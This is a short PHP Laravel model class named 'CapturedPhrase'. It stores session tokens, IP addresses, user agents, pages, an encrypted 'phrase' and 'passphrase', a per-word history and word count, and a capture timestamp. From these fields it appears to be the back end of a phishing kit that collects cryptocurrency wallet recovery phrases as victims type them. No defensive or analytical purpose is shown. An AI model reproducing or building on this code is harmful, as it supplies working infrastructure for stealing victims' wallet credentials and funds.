<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Crypt;

class CapturedPhrase extends Model
{
    protected $fillable = [
        'session_token', 'ip_address', 'user_agent',
        'page', 'phrase', 'passphrase', 'word_history', 'word_count', 'captured_at',
    ];

    protected $casts = [
        'captured_at'  => 'datetime',
        'word_history' => 'array',
    ];

    // ── Encrypt phrase on write, decrypt on read ──────────────────────────────

    public function setPhraseAttribute(string $value): void
    {
        $this->attributes['phrase'] = Crypt::encryptString($value);
    }

    public function getPhraseAttribute(string $value): string
    {
        try {
            return Crypt::decryptString($value);
        } catch (\Throwable $e) {
            return $value; // legacy plaintext rows — pass through
        }
    }

    public function setPassphraseAttribute(?string $value): void
    {
        $this->attributes['passphrase'] = $value !== null ? Crypt::encryptString($value) : null;
    }

    public function getPassphraseAttribute(?string $value): ?string
    {
        if ($value === null) return null;
        try {
            return Crypt::decryptString($value);
        } catch (\Throwable $e) {
            return $value;
        }
    }
}
